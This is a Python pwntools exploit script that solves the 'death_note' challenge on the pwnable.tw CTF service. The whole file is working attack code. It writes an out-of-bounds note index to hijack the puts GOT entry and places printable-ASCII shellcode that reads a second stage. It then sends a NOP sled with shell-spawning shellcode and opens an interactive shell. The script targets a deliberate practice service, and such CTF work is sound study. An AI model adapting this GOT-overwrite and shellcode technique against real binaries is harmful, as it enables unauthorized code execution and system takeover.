#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

local = 0
if local:
	p = process('./death_note')
else:
	p = remote('chall.pwnable.tw', 10201)

elf = ELF('./death_note')

def cmd(c):
	p.recvuntil('choice :')
	p.sendline(str(c))

def add(idx, name):
	cmd(1)
	p.recvuntil('Index :')
	p.sendline(str(idx))
	p.recvuntil('Name :')
	p.sendline(name)

def show(idx):
	cmd(2)
	p.recvuntil('Index :')
	p.sendline(str(idx))

def delete(idx):
	cmd(3)
	p.recvuntil('Index :')
	p.sendline(str(idx))

def quit():
	cmd(4)

note = 0x0804A060
offset = (elf.got['puts'] - note) / 4

sh = (
	'RY' + # push edx && pop ecx
	'jPX(A"(A"' + # set eax=0x50 && 2 * sub [0x41], 0x50
	'(A#(A#' + # 2 * sub [0x42], 0x50
	'jCX4CP[' + # set ebx=0
	'jpZ' + # set edx=0x70
	'jCX,@' # set eax=3
).ljust(0x22, 'P') + 'm '

print len(sh)
print disasm(sh)
for c in sh:
	if ord(c) <= 0x1F or ord(c) > 0x7F:
		raise ValueError, 'Value error.'

#gdb.attach(p, 'b *0x080487EF')

add(offset, sh)
payload = '\x90' * 0x30 + asm(shellcraft.sh())
#raw_input('@')
p.sendline(payload)

p.interactive()

